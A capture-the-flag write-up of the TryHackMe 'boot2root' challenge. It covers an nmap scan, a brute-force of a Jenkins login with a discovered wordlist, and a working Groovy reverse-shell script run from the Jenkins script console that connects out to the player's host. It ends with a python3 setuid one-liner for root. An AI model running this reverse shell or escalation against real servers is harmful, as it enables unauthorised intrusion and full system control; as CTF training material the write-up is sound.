---
title: Cyber Grabs CTF 0x03 – boot2root
date: '2022-02-07'
draft: false
authors: ['thebish0p']
tags: ['Cyber Grabs CTF 0x03', 'Jenkins', 'Shell', 'System Access', 'Privilege Escalation']
summary: 'Bruteforce jenkins login page with a wordlist we find leading to system access and proceeding by escalating to root'
---

## boot2root

> by MrGrep
>
> Let's Start!!! Alison is a SOC analyst of TheCyberGrabs Pvt Ltd. He got some alerts that someone is trying to access the server but he is not quite sure how that attack is getting executed so he wants to hire some pentesters to check the security can you help alison?
>
> Visit here to play:- [TryHackMe Room](https://tryhackme.com/jr/cybergrabsctf2022)
>
> Flag Format: `cybergrabs{boot2root}`

This challenge was hosted on TryHackMe. We launch an instance and start by running an nmap quick scan on the machine’s IP address to check for open ports:

```
nmap -T4 -A -F 10.10.156.214
```

```
Host is up (0.16s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   closed ftp
80/tcp   open   http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: CyberGrabs Jr CTF
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
8080/tcp open   http    Jetty 9.4.43.v20210629
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-server-header: Jetty(9.4.43.v20210629)
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

We start by browsing port 80 checking common files like `robots.txt` and we can find 2 interesting files:

![robots.txt](/static/images/cyber-grabs-ctf-0x03/robots.png)

As shown below `s3cret` is a wordlist and `confidential` is actually just random data encoded with Base32 with nothing useful for the challenge:

| ![s3cret](/static/images/cyber-grabs-ctf-0x03/s3cret.png) |
| :-------------------------------------------------------: |
|                         _s3cret_                          |

| ![confidential](/static/images/cyber-grabs-ctf-0x03/confidential.png) |
| :-------------------------------------------------------------------: |
|                            _confidential_                             |

| ![confidential decoded](/static/images/cyber-grabs-ctf-0x03/dec_confidential.png) |
| :-------------------------------------------------------------------------------: |
|                               _Base32 decoded data_                               |

We try running several wordlists using dirbuster but we don't find any other directories on port 80.

We proceed by going to port 8080 which had a Jenkins login page.

![Jenkins](/static/images/cyber-grabs-ctf-0x03/jenkins.png)

First idea we had was using the wordlist provided in `s3cret` to bruteforce the login page. Jenkins default username is `admin` so we start by bruteforcing that user. Unfortunetaly that idea didn’t work.

After a lot of trial and error we go back to the challenge description and notice that the name `Alison` is mentioned so we decided to try it as a username and bruteforce it again with the `s3cret` wordlist:

![Bruteforce Burp](/static/images/cyber-grabs-ctf-0x03/burp_bf.png)

We finally found the password `elizabeth1`.

We proceed by logging in to Jenkins:

![Logged in](/static/images/cyber-grabs-ctf-0x03/logged_in.png)

We proceed by going to the script console in order to have a reverse shell on the server as shown below:

```Groovy
String host="10.11.60.43";;
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close()
```

![Script Console](/static/images/cyber-grabs-ctf-0x03/script_console.png)

And now we have a shell:

![First shell](/static/images/cyber-grabs-ctf-0x03/first_shell.png)

We continue by stabilising the shell using `stty` as shown below:

![Stable](/static/images/cyber-grabs-ctf-0x03/stable.png)

And we manage to find the first flag in `/home/mrgrep/user.txt`. A Base32 encoded flag:

![User.txt](/static/images/cyber-grabs-ctf-0x03/user.txt.png)

![Decoded user.txt](/static/images/cyber-grabs-ctf-0x03/decoded_user.txt.png)

For the second part of the challenge, we need to get root access in order to read the `root.txt` file.

We notice that python has setuid capabilities by running `getcap`:

![getcap](/static/images/cyber-grabs-ctf-0x03/getcap.png)

This means that we can use python in order to perform a privilege escalation and get full root access by running `./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`:

![Priv Escalation](/static/images/cyber-grabs-ctf-0x03/privesc.png)

Finally, we have root access and we can read the `root.txt` and get the final flag:

![Root](/static/images/cyber-grabs-ctf-0x03/rootflag.png)
